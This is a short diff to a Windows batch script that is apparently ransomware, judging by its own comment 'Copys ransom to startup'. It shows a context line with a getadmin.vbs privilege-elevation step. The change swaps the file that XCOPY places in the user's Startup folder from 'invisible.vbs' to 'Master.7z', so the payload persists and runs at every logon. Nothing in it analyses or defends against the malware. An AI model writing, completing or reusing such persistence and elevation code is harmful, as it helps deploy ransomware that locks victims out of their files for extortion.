@@ -8,7 +8,7 @@ cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) &&
 
 :: Copys ransom to startup
 
-XCOPY "invisible.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+XCOPY "Master.7z" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 COLOR 8A
 COLOR 0B
